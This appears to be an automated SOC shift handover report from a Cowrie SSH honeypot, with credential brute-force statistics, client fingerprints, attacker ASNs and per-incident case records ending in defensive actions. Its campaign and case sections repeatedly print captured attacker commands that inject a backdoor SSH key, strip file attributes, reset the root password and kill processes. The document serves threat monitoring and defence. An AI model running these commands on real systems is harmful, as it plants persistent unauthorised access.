# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-07 |
| **Generated At** | 2026-04-07T13:15:12Z |
| **Shift Time** | 13:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **202** |
| Confirmed Threats | **198** |
| False Positives Filtered | **4** (2.0%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **10** |
| High Severity Cases | **75** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **127** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **179** |
| Unique Credential Pairs | **79** |
| Unique Usernames | **35** |
| Unique Passwords | **75** |
| Successful Auth Pairs | **45** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 75 |
| `345gs5662d34` | 39 |
| `ubuntu` | 8 |
| `user` | 4 |
| `server` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 39 |
| `3245gs5662d34` | 36 |
| `1234` | 3 |
| `server!2026` | 2 |
| `Ftpuser8` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 39 |
| `root` | `3245gs5662d34` | 36 |
| `server` | `server!2026` | 2 |
| `dev` | `Dev2025!` | 2 |
| `user02` | `1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWE!1234` | `118.194.234.8` | 2026-04-07T11:13:15 |
| `root` | `3245gs5662d34` | `118.194.234.8` | 2026-04-07T11:13:18 |
| `root` | `A123123E` | `172.173.200.62` | 2026-04-07T11:13:37 |
| `root` | `3245gs5662d34` | `172.173.200.62` | 2026-04-07T11:14:04 |
| `root` | `Root2019!@` | `118.194.234.8` | 2026-04-07T11:16:43 |
| `root` | `abc112233` | `14.103.118.226` | 2026-04-07T11:17:43 |
| `root` | `QWE!1234` | `170.79.37.82` | 2026-04-07T11:20:55 |
| `root` | `3245gs5662d34` | `170.79.37.82` | 2026-04-07T11:21:02 |
| `root` | `rootpasswd` | `118.194.234.8` | 2026-04-07T11:21:54 |
| `root` | `Wx123456` | `172.173.200.62` | 2026-04-07T11:24:20 |
| `root` | `123@qwe` | `170.79.37.82` | 2026-04-07T11:25:24 |
| `root` | `rootme` | `170.79.37.82` | 2026-04-07T11:28:58 |
| `root` | `qa2ws3ed@#` | `170.79.37.82` | 2026-04-07T11:31:16 |
| `root` | `Root2019!@` | `170.79.37.82` | 2026-04-07T11:32:29 |
| `root` | `qa2ws3ed@#` | `118.194.234.8` | 2026-04-07T11:32:37 |
| `root` | `rootpasswd` | `170.79.37.82` | 2026-04-07T11:34:48 |
| `root` | `root@888` | `152.32.218.244` | 2026-04-07T11:34:52 |
| `root` | `3245gs5662d34` | `152.32.218.244` | 2026-04-07T11:34:54 |
| `root` | `Qwerty#123456` | `165.154.6.104` | 2026-04-07T11:35:25 |
| `root` | `3245gs5662d34` | `165.154.6.104` | 2026-04-07T11:35:28 |
| `root` | `root2026$` | `170.79.37.82` | 2026-04-07T11:36:02 |
| `root` | `Aa123456...` | `170.79.37.82` | 2026-04-07T11:38:27 |
| `root` | `incorrect` | `147.135.251.134` | 2026-04-07T11:42:43 |
| `root` | `3245gs5662d34` | `147.135.251.134` | 2026-04-07T11:42:47 |
| `root` | `hellohello` | `147.135.251.134` | 2026-04-07T11:44:11 |
| `root` | `qwerty1!` | `172.173.200.62` | 2026-04-07T11:44:46 |
| `root` | `123@qwe` | `118.194.234.8` | 2026-04-07T11:45:17 |
| `root` | `qazwsx6666@#` | `147.135.251.134` | 2026-04-07T11:45:36 |
| `root` | `rootme` | `118.194.234.8` | 2026-04-07T11:46:58 |
| `root` | `qazwsx111#$` | `147.135.251.134` | 2026-04-07T11:48:20 |
| `root` | `Aa123456...` | `118.194.234.8` | 2026-04-07T11:48:41 |
| `root` | `!QA@WS3ed` | `147.135.251.134` | 2026-04-07T11:51:17 |
| `root` | `root2026$` | `118.194.234.8` | 2026-04-07T11:52:12 |
| `root` | `BBaa000` | `147.135.251.134` | 2026-04-07T11:54:15 |
| `root` | `ZAQ!2wsx321@123` | `147.135.251.134` | 2026-04-07T11:55:43 |
| `root` | `admin*123` | `147.135.251.134` | 2026-04-07T11:57:12 |
| `root` | `Root123123.` | `147.135.251.134` | 2026-04-07T11:58:38 |
| `root` | `100` | `172.173.200.62` | 2026-04-07T11:59:54 |
| `root` | `qazwsx1111111@#` | `147.135.251.134` | 2026-04-07T12:02:53 |
| `root` | `admin1234567!!` | `172.173.200.62` | 2026-04-07T12:09:57 |
| `root` | `Qazwsx2019.` | `172.173.200.62` | 2026-04-07T12:19:40 |
| `root` | `ZAQ!2wsx321` | `172.173.200.62` | 2026-04-07T12:24:36 |
| `root` | `Root001` | `172.173.200.62` | 2026-04-07T12:45:07 |
| `root` | `Root112233$` | `172.173.200.62` | 2026-04-07T12:55:07 |
| `root` | `Cmcc@10086` | `172.173.200.62` | 2026-04-07T13:00:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **202** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 194 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 192 | 9 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 192 | 9 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 36 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WvxNFHndVG1g"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `172.173.200.62`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:xpXEVgGO1Ngl"|chpasswd|bash
```
Source IPs: `14.103.118.226`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.194.234.8`, `152.32.218.244`, `172.173.200.62`, `147.135.251.134`, `165.154.6.104`, `170.79.37.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **12** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS2527` | Sony Network Communications Inc. | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS6147` | INTEGRATEL PERÚ S.A.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (75)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-53b0cb301519

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:13 |
| **Last Seen** | 2026-04-07 11:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:13:15` | `cowrie.session.connect` |
| `2026-04-07 11:13:15` | `cowrie.client.version` |
| `2026-04-07 11:13:15` | `cowrie.client.kex` |
| `2026-04-07 11:13:15` | `cowrie.login.success` |
| `2026-04-07 11:13:15` | `cowrie.session.params` |
| `2026-04-07 11:13:15` | `cowrie.command.input` |
| `2026-04-07 11:13:15` | `cowrie.command.failed` |
| `2026-04-07 11:13:15` | `cowrie.log.closed` |
| `2026-04-07 11:13:16` | `cowrie.session.params` |
| `2026-04-07 11:13:16` | `cowrie.command.input` |
| `2026-04-07 11:13:16` | `cowrie.session.file_download` |
| `2026-04-07 11:13:16` | `cowrie.log.closed` |
| `2026-04-07 11:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a190946226

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:13 |
| **Last Seen** | 2026-04-07 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:13:17` | `cowrie.session.connect` |
| `2026-04-07 11:13:17` | `cowrie.client.version` |
| `2026-04-07 11:13:17` | `cowrie.client.kex` |
| `2026-04-07 11:13:18` | `cowrie.login.success` |
| `2026-04-07 11:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-382a728f0571

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:13 |
| **Last Seen** | 2026-04-07 11:14 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:13:29` | `cowrie.session.connect` |
| `2026-04-07 11:13:29` | `cowrie.client.version` |
| `2026-04-07 11:13:29` | `cowrie.client.kex` |
| `2026-04-07 11:13:37` | `cowrie.login.success` |
| `2026-04-07 11:13:46` | `cowrie.session.params` |
| `2026-04-07 11:13:46` | `cowrie.command.input` |
| `2026-04-07 11:13:46` | `cowrie.command.failed` |
| `2026-04-07 11:13:47` | `cowrie.log.closed` |
| `2026-04-07 11:13:48` | `cowrie.session.params` |
| `2026-04-07 11:13:48` | `cowrie.command.input` |
| `2026-04-07 11:13:50` | `cowrie.session.file_download` |
| `2026-04-07 11:13:50` | `cowrie.log.closed` |
| `2026-04-07 11:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ede04de8377

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:13 |
| **Last Seen** | 2026-04-07 11:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:13:57` | `cowrie.session.connect` |
| `2026-04-07 11:13:58` | `cowrie.client.version` |
| `2026-04-07 11:14:00` | `cowrie.client.kex` |
| `2026-04-07 11:14:04` | `cowrie.login.success` |
| `2026-04-07 11:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250fb7320b2e

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:16 |
| **Last Seen** | 2026-04-07 11:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:16:43` | `cowrie.session.connect` |
| `2026-04-07 11:16:43` | `cowrie.client.version` |
| `2026-04-07 11:16:43` | `cowrie.client.kex` |
| `2026-04-07 11:16:43` | `cowrie.login.success` |
| `2026-04-07 11:16:44` | `cowrie.session.params` |
| `2026-04-07 11:16:44` | `cowrie.command.input` |
| `2026-04-07 11:16:44` | `cowrie.command.failed` |
| `2026-04-07 11:16:44` | `cowrie.log.closed` |
| `2026-04-07 11:16:44` | `cowrie.session.params` |
| `2026-04-07 11:16:44` | `cowrie.command.input` |
| `2026-04-07 11:16:44` | `cowrie.session.file_download` |
| `2026-04-07 11:16:44` | `cowrie.log.closed` |
| `2026-04-07 11:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e3f82218b84

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:16 |
| **Last Seen** | 2026-04-07 11:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:16:45` | `cowrie.session.connect` |
| `2026-04-07 11:16:45` | `cowrie.client.version` |
| `2026-04-07 11:16:45` | `cowrie.client.kex` |
| `2026-04-07 11:16:46` | `cowrie.login.success` |
| `2026-04-07 11:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa2adbc45135

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]226` |
| **First Seen** | 2026-04-07 11:17 |
| **Last Seen** | 2026-04-07 11:22 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xpXEVgGO1Ngl"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:17:42` | `cowrie.session.connect` |
| `2026-04-07 11:17:42` | `cowrie.client.version` |
| `2026-04-07 11:17:42` | `cowrie.client.kex` |
| `2026-04-07 11:17:43` | `cowrie.login.success` |
| `2026-04-07 11:17:44` | `cowrie.session.params` |
| `2026-04-07 11:17:44` | `cowrie.command.input` |
| `2026-04-07 11:17:44` | `cowrie.command.failed` |
| `2026-04-07 11:17:44` | `cowrie.log.closed` |
| `2026-04-07 11:17:45` | `cowrie.session.params` |
| `2026-04-07 11:17:45` | `cowrie.command.input` |
| `2026-04-07 11:17:45` | `cowrie.session.file_download` |
| `2026-04-07 11:17:45` | `cowrie.log.closed` |
| `2026-04-07 11:17:55` | `cowrie.session.params` |
| `2026-04-07 11:17:55` | `cowrie.command.input` |
| `2026-04-07 11:17:55` | `cowrie.log.closed` |
| `2026-04-07 11:17:56` | `cowrie.session.params` |
| `2026-04-07 11:17:56` | `cowrie.command.input` |
| `2026-04-07 11:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]226` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fcad1d98865

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:20 |
| **Last Seen** | 2026-04-07 11:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:20:53` | `cowrie.session.connect` |
| `2026-04-07 11:20:53` | `cowrie.client.version` |
| `2026-04-07 11:20:54` | `cowrie.client.kex` |
| `2026-04-07 11:20:55` | `cowrie.login.success` |
| `2026-04-07 11:20:56` | `cowrie.session.params` |
| `2026-04-07 11:20:56` | `cowrie.command.input` |
| `2026-04-07 11:20:56` | `cowrie.command.failed` |
| `2026-04-07 11:20:56` | `cowrie.log.closed` |
| `2026-04-07 11:20:57` | `cowrie.session.params` |
| `2026-04-07 11:20:57` | `cowrie.command.input` |
| `2026-04-07 11:20:57` | `cowrie.session.file_download` |
| `2026-04-07 11:20:57` | `cowrie.log.closed` |
| `2026-04-07 11:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15eb2db07a66

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:21 |
| **Last Seen** | 2026-04-07 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:21:00` | `cowrie.session.connect` |
| `2026-04-07 11:21:00` | `cowrie.client.version` |
| `2026-04-07 11:21:01` | `cowrie.client.kex` |
| `2026-04-07 11:21:02` | `cowrie.login.success` |
| `2026-04-07 11:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b845833a50e

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:21 |
| **Last Seen** | 2026-04-07 11:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
